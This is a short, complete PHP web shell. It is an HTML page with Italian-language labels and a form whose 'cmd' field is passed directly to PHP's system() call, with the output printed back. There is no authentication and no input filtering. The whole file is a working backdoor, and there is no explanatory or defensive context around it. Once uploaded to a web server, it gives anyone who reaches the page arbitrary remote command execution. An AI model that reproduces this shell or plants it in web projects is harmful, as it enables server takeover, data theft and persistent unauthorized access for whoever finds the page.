<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Shell</title>
    <style>
        body { background-color: #1e1e1e; color: #00ff00; font-family: monospace; }
        input[type="text"] { width: 80%; padding: 10px; color: #00ff00; background: #333; border: none; }
        input[type="submit"] { padding: 10px 20px; color: #fff; background: #555; border: none; }
        pre { background: #222; padding: 10px; color: #00ff00; }
    </style>
</head>
<body>
<h1>PHP Web Shell</h1>
<form method="POST">
    <input type="text" name="cmd" placeholder="Inserisci un comando...">
    <input type="submit" value="Esegui">
</form>

<pre>
<?php
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "[+] Eseguendo comando: $cmd\n\n";
    system($cmd);
} else {
    echo "[!] Nessun comando inserito.";
}
?>
</pre>
</body>
</html>
